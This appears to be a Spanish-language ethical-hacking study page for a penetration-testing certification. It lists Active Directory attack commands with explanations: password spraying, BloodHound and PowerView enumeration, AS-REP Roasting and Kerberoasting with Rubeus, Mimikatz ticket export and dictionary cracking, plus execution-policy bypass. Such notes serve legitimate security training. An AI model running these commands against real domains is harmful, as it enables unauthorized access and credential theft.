
# Active Directory Penetration Testing

## <mark style="color:$primary;">Cheatsheet</mark>

### Acceso Inicial

#### Password Spraying

<table data-header-hidden><thead><tr><th width="316"></th><th></th></tr></thead><tbody><tr><td>Comando</td><td>Qué hace</td></tr><tr><td><code>.\DomainPasswordSpray.ps1</code></td><td>Carga el script de DomainPasswordSpray en memoria</td></tr><tr><td><code>Invoke-DomainPasswordSpray -UserList .\USERFILE -Password PASS</code></td><td>Ejecuta un ataque de rociado de contraseña (una misma contraseña probada contra múltiples usuarios)</td></tr><tr><td><code>-Verbose</code></td><td>(Parámetro opcional) Muestra información detallada de la ejecución</td></tr></tbody></table>

***

### Enumeración

#### BloodHound

<table data-header-hidden><thead><tr><th width="354.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Comando</td><td>Qué hace</td></tr><tr><td><code>cd C:\tools\BloodHound\BloodHound\resources\app\Collectors</code></td><td>Navega al directorio donde están los colectores de BloodHound</td></tr><tr><td><code>powershell -ep bypass</code></td><td>Ejecuta PowerShell omitiendo las restricciones de ejecución de scripts</td></tr><tr><td><code>.\SharpHound.ps1</code></td><td>Carga el script SharpHound (colector de datos para BloodHound)</td></tr><tr><td><code>Invoke-Bloodhound -CollectionMethod All</code></td><td>Ejecuta la recolección de todos los datos posibles del Active Directory</td></tr><tr><td>(Genera un archivo <code>.ZIP</code>)</td><td>El comando anterior genera un archivo comprimido con los datos recopilados</td></tr><tr><td><code>cd C:\tools\BloodHound\BloodHound</code></td><td>Navega al directorio donde está instalada la aplicación BloodHound</td></tr><tr><td>Abrir la app BloodHound</td><td>Inicia la interfaz gráfica de BloodHound</td></tr><tr><td>Usuario: <code>neo4j</code> / Contraseña: <code>Password@123</code></td><td>Credenciales de autenticación para la base de datos Neo4j</td></tr><tr><td>Click en <em>Upload Data</em> (arriba a la derecha)</td><td>Abre el diálogo para subir el archivo <code>.ZIP</code> a BloodHound</td></tr><tr><td>Subir el archivo <code>.ZIP</code></td><td>Importa los datos recopilados a la base de datos Neo4j</td></tr><tr><td>Click menú → <em>Database Info</em> → <em>Refresh database stats</em></td><td>Actualiza las estadísticas de la base de datos después de la importación</td></tr><tr><td><em>Analysis</em> → elegir opción necesaria</td><td>Ejecuta análisis predefinidos para encontrar rutas de ataque en AD</td></tr></tbody></table>

#### PowerView

<table data-header-hidden><thead><tr><th width="354.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Comando</td><td>Qué hace</td></tr><tr><td><code>powershell -ep bypass</code></td><td>Ejecuta PowerShell omitiendo las restricciones de ejecución de scripts</td></tr><tr><td><code>. .\PowerView.ps1</code></td><td>Carga el script PowerView en memoria para enumerar AD</td></tr><tr><td><code>Get-NetUser | Select-Object -Property samaccountname</code></td><td>Lista todos los usuarios del dominio mostrando solo sus nombres de cuenta</td></tr><tr><td><code>Get-NetUser -PreauthNotRequired | select samaccountname, useraccountcontrol</code></td><td>Encuentra cuentas con autenticación previa no requerida (vulnerables a ataques AS-REP Roasting)</td></tr><tr><td><code>Get-Domain</code></td><td>Obtiene el nombre del dominio actual</td></tr><tr><td><code>Get-Domain -Domain NOMBREDEDOMINIO</code></td><td>Obtiene información de un dominio específico</td></tr><tr><td><code>Get-DomainSID</code></td><td>Obtiene el identificador de seguridad (SID) del dominio</td></tr><tr><td><code>Get-DomainController</code></td><td>Lista los controladores de dominio del dominio actual</td></tr><tr><td><code>Get-DomainUser</code></td><td>Lista todos los usuarios del dominio con todos sus atributos</td></tr><tr><td><code>Get-DomainUser -Identity NOMBREDEUSUARIO</code></td><td>Obtiene información detallada de un usuario específico</td></tr><tr><td><code>Get-NetComputer</code></td><td>Lista todas las computadoras del dominio</td></tr><tr><td><code>Get-NetGroup</code></td><td>Lista todos los grupos del dominio</td></tr><tr><td><code>Get-NetGroup -username "USUARIO"</code></td><td>Muestra los grupos a los que pertenece un usuario específico</td></tr><tr><td><code>Get-NetGroupMember "NOMBREDELGRUPO"</code></td><td>Lista los miembros de un grupo específico (ej. Domain Admins)</td></tr><tr><td><code>Find-DomainShare -ComputerName NOMBREDELPC -verbose</code></td><td>Busca recursos compartidos en un equipo específico del dominio</td></tr><tr><td><code>Get-NetShare</code></td><td>Lista todos los recursos compartidos disponibles en el dominio</td></tr><tr><td><code>Get-NetGPO</code></td><td>Lista todos los objetos de directiva de grupo (GPO)</td></tr><tr><td><code>Get-NetOU</code></td><td>Lista todas las unidades organizativas (OU) del dominio</td></tr><tr><td><code>Get-NetDomainTrust</code></td><td>Lista las relaciones de confianza del dominio</td></tr><tr><td><code>Get-NetForest</code></td><td>Obtiene información del bosque (forest) de Active Directory</td></tr><tr><td><code>Get-NetForestDomain</code></td><td>Lista todos los dominios dentro del bosque de AD</td></tr></tbody></table>

### Escalada de Privilegios

#### AS-REP Roasting

<table data-header-hidden><thead><tr><th width="358"></th><th></th></tr></thead><tbody><tr><td>Comando</td><td>Qué hace</td></tr><tr><td><code>powershell -ep bypass</code></td><td>Ejecuta PowerShell omitiendo las restricciones de ejecución de scripts</td></tr><tr><td><code>. .\PowerView.ps1</code></td><td>Carga el script PowerView para enumerar Active Directory</td></tr><tr><td><code>Get-Domainuser | Where-Object{$_.UserAccountControl -like "*DONT_REQ_PREAUTH*"}</code></td><td>Filtra y muestra usuarios que no requieren autenticación previa (vulnerables a AS-REP Roasting)</td></tr><tr><td><code>Revisar samaccountname</code></td><td>Revisa los nombres de cuenta (samaccountname) de los usuarios vulnerables</td></tr><tr><td><code>.\Rubeus.exe aseproast /user:USERNAME /outfile:hash.txt</code></td><td>Extrae el hash AS-REP del usuario especificado y lo guarda en un archivo</td></tr><tr><td><code>.\john.exe hash.txt --format=krb5asrep --wordlist=10k-worst-pass.txt</code></td><td>Craquea el hash AS-REP usando John the Ripper con un diccionario de contraseñas comunes</td></tr></tbody></table>

***

#### Kerberoasting

| Comando                                                                                     | Qué hace                                                                                                     |
| ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| `powershell -ep bypass`                                                                     | Ejecuta PowerShell omitiendo las restricciones de ejecución de scripts                                       |
| `.\PowerView.ps1`                                                                           | Carga el script PowerView para enumerar Active Directory                                                     |
| `Get-NetUser \| Where-Object{$_.servicePrincipalName} \| fl`                                | Lista todos los usuarios que tienen un Service Principal Name (SPN) - potenciales objetivos de Kerberoasting |
| `setspn -T research -Q "/"`                                                                 | Consulta y muestra todos los SPN registrados en el dominio "research"                                        |
| `Add-Type -AssemblyName System.IdentityModel`                                               | Carga el ensamblado System.IdentityModel para trabajar con tickets Kerberos                                  |
| `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"` | Solicita un ticket Kerberos para el SPN especificado (lo cachea en memoria)                                  |
| `.\Invoke-Mimikatz.ps1`                                                                     | Carga el script Invoke-Mimikatz en memoria                                                                   |
| `Invoke-Mimikatz -Command "Kerberos::list /export"`                                         | Extrae y exporta todos los tickets Kerberos cacheados a archivos `.kirbi`                                    |
| `python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\TICKETFILE`          | Craquea el ticket Kerberos (hash TGS) usando un diccionario de contraseñas comunes                           |

\ <br>

## <mark style="color:$primary;">Secciones</mark>

{% content-ref url="/pages/WlhZd6auFRSL0nrNSiPp" %}
[Active Directory Primer](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/active-directory-primer.md)
{% endcontent-ref %}

{% content-ref url="/pages/raLs8f6zhVTplLbi9cg2" %}
[AD Enumeration](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/ad-enumeration.md)
{% endcontent-ref %}

{% content-ref url="/pages/ogi4m5mMHUHGQXhH0YR6" %}
[AD Privilege Escalation](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/ad-privilege-escalation.md)
{% endcontent-ref %}

{% content-ref url="/pages/ztKlJnWmaSWjzeZ2wlCs" %}
[AD Lateral Movement](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/ad-lateral-movement.md)
{% endcontent-ref %}

{% content-ref url="/pages/fakBYxpUAeHfKnuVEWUr" %}
[AD Persistence](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/ad-persistence.md)
{% endcontent-ref %}

{% content-ref url="/pages/apmhF95AQDQPgnA37h7a" %}
[Active Directory Penetration Testing CTF 1](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/active-directory-penetration-testing-ctf-1.md)
{% endcontent-ref %}
